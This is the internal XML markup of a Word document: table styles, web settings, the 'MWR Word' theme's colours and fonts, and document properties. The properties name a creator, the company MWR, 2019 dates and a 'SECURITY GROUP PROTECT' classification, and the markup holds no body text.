        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="8ABFE0" w:themeColor="text1" w:themeTint="66"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="51A0D1" w:themeColor="text1" w:themeTint="99"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="2" w:space="0" w:color="51A0D1"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523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14A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14A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AD331D"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode"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31129">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="616176134">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="826475058">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="849638717">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="915095758">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1648509898">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="196411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z.hammond\AppData\Roaming\Microsoft\Templates\MWR%20Blank.dotx" TargetMode="External"/></Relationships>
</file>

<file path=word/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office Theme">
  <a:themeElements>
    <a:clrScheme name="MWR Word">
      <a:dk1>
        <a:srgbClr val="1E5272"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="000000"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="142F66"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="68727B"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="D94D22"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="A7A8B0"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="00929F"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="1E5272"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="007698"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="E5B53B"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="DEDEE0"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="MWR">
      <a:majorFont>
        <a:latin typeface="Lucida Console"/>
        <a:ea typeface=""/>
        <a:cs typeface=""/>
      </a:majorFont>
      <a:minorFont>
        <a:latin typeface="Lucida Sans Unicod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EFE4C-1C9D-41C1-B151-6C4D78ECF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MWR Blank.dotx</Template>
  <TotalTime>0</TotalTime>
  <Pages>9</Pages>
  <Words>1758</Words>
  <Characters>10026</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mwri</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Manager/>
  <Company>MWR</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mwri</dc:title>
  <dc:subject/>
  <dc:creator>Aliz Hammond</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Aliz Hammond</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <cp:lastPrinted>2016-02-12T09:09:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-08-15T10:24:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-08-15T10:24:00Z</dcterms:modified>
  <cp:category>Blank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
    <vt:lpwstr>PROTECT</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="Classification">
    <vt:lpwstr>SECURITY GROUP PROTECT</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="Descriptor">
    <vt:lpwstr>SECURITY GROUP</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5" name="TemplateName">
    <vt:lpwstr>MWR Blank</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6" name="TemplateVersion">
    <vt:lpwstr>0.02</vt:lpwstr>
  </property>
</Properties>
</file>